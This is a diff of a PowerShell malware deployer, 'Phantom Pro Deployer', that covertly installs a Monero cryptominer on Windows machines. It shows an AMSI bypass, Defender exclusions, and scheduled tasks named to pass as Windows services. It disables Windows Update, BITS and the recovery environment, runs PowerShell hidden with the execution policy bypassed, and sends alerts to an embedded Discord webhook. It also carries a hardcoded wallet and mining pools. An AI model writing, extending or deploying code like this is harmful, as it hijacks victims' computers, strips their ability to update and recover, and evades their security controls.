@@ -1,8 +1,8 @@
-# ============================================================
-#  PHANTOM PRO DEPLOYER v4.2
+\# ============================================================
+#  PHANTOM PRO DEPLOYER v4.3
+#  - Personalized for itzcurled
 #  - AMSI Bypass (In-Memory Stealth)
-#  - HugePages Hashrate Optimizer (+30% Speed)
-#  - Discord Webhook Alerts
+#  - Discord Webhook Alerts (Correct itzcurled URL)
 #  - Windows Update & Reset Lockdown
 #  - Auto-Cleanup (One Miner per Machine)
 # ============================================================
@@ -23,10 +23,10 @@ $ghOwner = "itzcurled"
 $ghRepo = "secretthing"
 $ghConfigPath = "config.json"
 
-# Webhook for notifications
+# CORRECT webhook for itzcurled
 $webhookUrl = "https://discord.com/api/webhooks/1506387263402278992/f3X-mX_mjq74YCqpZYNB2WH4hEg6NZj8LY6lPstCCtz31kJwthqkxXF580E187PnZI2a"
 
-# Fallback values if GitHub is unreachable
+# CORRECT itzcurled wallet
 $wallet = "473TeE9SqJGd59Y7gzTjgmT4VNo1KK3y2QzZppdGSGQbbwCDpTrRYUMhRNoXattjfQPwpjzi92zB2NrDiHgm9kuF7Wp63tF"
 $pool = "pool.supportxmr.com:443"
 $poolBak = "pool.hashvault.pro:443"
@@ -214,7 +214,7 @@ objShell.Run "powershell.exe -ExecutionPolicy Bypass -WindowStyle Hidden -File "
 }
 
 function Set-Persistence {
-    try { reagentc /disable 2>$null } catch {}
+    try { & reagentc.exe /disable 2>$null } catch {}
 
     $taskName = "WindowsServiceUpdate"
     $wdTask = "WindowsServiceMonitor"
@@ -254,24 +254,12 @@ function Disable-Sleep {
 
 function Lock-Services {
     try {
-        reagentc /disable 2>$null
+        & reagentc.exe /disable 2>$null
         $svcs = "wuauserv", "bits", "dosvc"
         foreach ($s in $svcs) {
             Set-Service -Name $s -StartupType Disabled -ErrorAction SilentlyContinue
             Stop-Service -Name $s -Force -ErrorAction SilentlyContinue
         }
-    } catch {}
-}
-
-function Enable-HugePages {
-    try {
-        $sid = (New-Object System.Security.Principal.NTAccount($env:USERNAME)).Translate([System.Security.Principal.SecurityIdentifier]).Value
-        $tmp = "$env:TEMP\priv.cfg"; secedit /export /cfg $tmp /quiet
-        $content = Get-Content $tmp -Raw
-        if ($content -match 'SeLockMemoryPrivilege\s*=\s*(.*)') {
-            if ($content -notlike "*$sid*") { $content = $content -replace "(SeLockMemoryPrivilege\s*=\s*)(.*)", "`$1`$2,*$sid" }
-        } else { $content = $content -replace "(\[Privilege Rights\])", "`$1`r`nSeLockMemoryPrivilege = *$sid" }
-        Set-Content $tmp $content -Force; secedit /configure /db "$env:TEMP\priv.sdb" /cfg $tmp /quiet; Remove-Item $tmp -Force
     } catch {}
 }
 
@@ -308,7 +296,6 @@ try {
     Add-Exclusion
     Lock-Services
     Disable-Sleep
-    Enable-HugePages
     Install-Miner
     Write-MinerConfig -CpuPercent $idleCpu
     Write-Watchdog
@@ -325,7 +312,7 @@ try {
     $psi.UseShellExecute = $false
     [System.Diagnostics.Process]::Start($psi) | Out-Null
 
-    [Console]::WriteLine("[+] Phantom Pro v4.2 Deployed - Performance & Stealth Maxed.")
+    [Console]::WriteLine("[+] Phantom Pro v4.3 Deployed - Personalized for itzcurled.")
 } catch {
     [Console]::WriteLine("[-] Deployment failed: $_")
 }
